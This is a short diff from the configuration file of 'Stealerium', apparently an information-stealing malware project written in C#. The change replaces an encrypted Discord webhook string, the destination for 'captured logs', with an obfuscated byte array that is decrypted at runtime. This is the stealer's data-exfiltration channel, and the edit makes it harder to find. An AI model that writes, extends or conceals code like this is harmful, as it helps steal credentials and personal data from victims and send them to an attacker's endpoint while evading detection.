@@ -36,8 +36,7 @@ namespace Stealerium
         public static string GrabberModule = "0";
 
         // Discord Webhook where to send captured logs
-        public static string Webhook =
-            "ENCRYPTED:fleaTKsR0trQiaWh0H+vOvHR4WDn0LEpdxH+edudpJFgHk0gqzZqQCrz+uijeyRD9bd90K68CTHNtovE8WK18CnFZZT8xgGBmQSEPuAUSPDHQqgVOeILB5awg4etFhtwJlPmQhKwgLhRgNNKFka8/ekJmadm1C0L2jqQNBRG8Bg=";
+        public static string Webhook = StringsCrypt.Decrypt(new byte[] { 126, 87, 154, 76, 171, 17, 210, 218, 208, 137, 165, 161, 208, 127, 175, 58, 241, 209, 225, 96, 231, 208, 177, 41, 119, 17, 254, 121, 219, 157, 164, 145, 75, 249, 238, 17, 214, 228, 112, 102, 181, 38, 79, 30, 179, 69, 250, 123, 72, 11, 162, 180, 32, 233, 95, 197, 227, 76, 246, 206, 19, 12, 73, 233, 253, 194, 187, 153, 194, 139, 33, 45, 25, 129, 213, 54, 49, 209, 40, 206, 151, 155, 172, 88, 223, 250, 135, 171, 1, 132, 207, 76, 36, 16, 28, 190, 182, 38, 247, 34, 87, 208, 166, 96, 72, 50, 153, 153, 195, 35, 27, 61, 17, 36, 243, 131, 206, 86, 64, 128, 177, 49, 175, 80, 21, 133, 120, 242, });
 #elif RELEASE
         // Debug mode (write all exceptions to file)
         public static string DebugMode = "--- Debug ---";
